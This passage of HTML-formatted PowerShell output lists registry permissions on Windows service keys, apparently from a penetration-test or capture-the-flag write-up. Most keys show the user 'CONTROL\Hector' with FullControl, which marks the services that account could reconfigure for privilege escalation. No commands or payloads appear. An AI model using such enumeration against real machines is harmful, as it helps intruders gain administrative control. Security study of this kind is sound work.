NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sppsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sppsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\srv2</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\srv2</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\srvnet</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\srvnet</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SSDPSRV</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SSDPSRV</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ssh-agent</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ssh-agent</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SstpSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SstpSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\StateRepository</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\StateRepository</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\stexstor</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\stexstor</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\stisvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\stisvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storahci</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storahci</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storflt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storflt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\stornvme</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\stornvme</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storqosflt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storqosflt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\StorSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\StorSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storufs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storufs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storvsc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\storvsc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\svsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\svsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\swenum</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\swenum</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\swprv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\swprv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Synth3dVsc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Synth3dVsc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SysMain</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SysMain</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SystemEventsBroker</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SystemEventsBroker</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TabletInputService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TabletInputService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tapisrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tapisrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Tcpip</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Tcpip</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Tcpip6</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Tcpip6</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TCPIP6TUNNEL</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TCPIP6TUNNEL</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tcpipreg</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tcpipreg</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TCPIPTUNNEL</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TCPIPTUNNEL</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tdx</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tdx</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\terminpt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\terminpt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TermService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TermService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Themes</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Themes</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TieringEngineService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TieringEngineService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TimeBrokerSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TimeBrokerSvc</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TokenBroker</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TokenBroker</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\toolsrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\toolsrv</span><br><span class="line">AccessToString          : BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Power Users Allow  SetValue, CreateSubKey, Delete, ReadKey</span><br><span class="line">                          BUILTIN\Power Users Allow  -1073676288</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TPM</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TPM</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TrkWks</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TrkWks</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TrustedInstaller</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TrustedInstaller</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TSDDD</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TSDDD</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TsUsbFlt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TsUsbFlt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TsUsbGD</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\TsUsbGD</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tsusbhub</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tsusbhub</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tunnel</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tunnel</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tzautoupdate</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\tzautoupdate</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UALSVC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UALSVC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UASPStor</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UASPStor</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmCx0101</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmCx0101</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmTcpciCx0101</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmTcpciCx0101</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmUcsi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmUcsi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmUcsiAcpiClient</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmUcsiAcpiClient</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmUcsiCx0101</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UcmUcsiCx0101</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ucx01000</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ucx01000</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : 